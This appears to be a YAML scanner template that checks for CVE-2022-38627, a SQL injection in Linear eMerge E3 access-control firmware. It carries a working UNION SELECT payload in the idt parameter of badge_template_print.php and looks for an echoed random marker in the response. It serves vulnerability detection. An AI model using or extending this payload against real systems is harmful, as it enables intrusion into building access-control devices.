name: yaml-poc-niceforyou-linear_emerge_e3_access_control_firmware-sql_injection-CVE-2022-38627
binding: 03a0671d-83dd-46b2-a6f7-0d6f6d10b312
detail:
    author: jiapeng.han
    links:
        - https://github.com/omarhashem123/Security-Research/blob/main/CVE-2022-38627/CVE-2022-38627.txt
        - https://github.com/omarhashem123/Security-Research/blob/main/CVE-2022-38627/CVE-2022-38627.yaml
    vulnerability:
        id: c60d4f87-dcba-4166-a0d4-4e348ad48564
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(10000, 99999)
    s1: randomLowercase(8)
    s2: s1 + ":" + string(r1)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /badging/badge_template_print.php?tpl=aa.xml&idt=1337%20union%20select%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'%20{{s1}}:'||abs(-{{r1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20from%20version
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(s2)
expression: r0()
